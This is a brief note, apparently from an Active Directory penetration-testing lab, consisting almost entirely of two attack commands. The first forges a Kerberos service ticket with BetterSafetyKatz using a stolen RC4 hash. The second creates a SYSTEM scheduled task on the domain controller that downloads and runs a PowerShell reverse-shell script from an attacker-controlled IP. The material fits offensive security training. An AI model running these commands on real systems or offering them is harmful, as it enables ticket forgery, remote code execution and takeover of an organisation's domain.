# Services

```powershell
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local/sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local/service:HOST /rc4:4e9815869d2090ccfca61c1fe0d23986 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

```
> schtasks /create /S dcorp-dc /SC Weekly /RU "NT Authority\SYSTEM" /TN "UserX" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcpEx.ps1''')'"
```

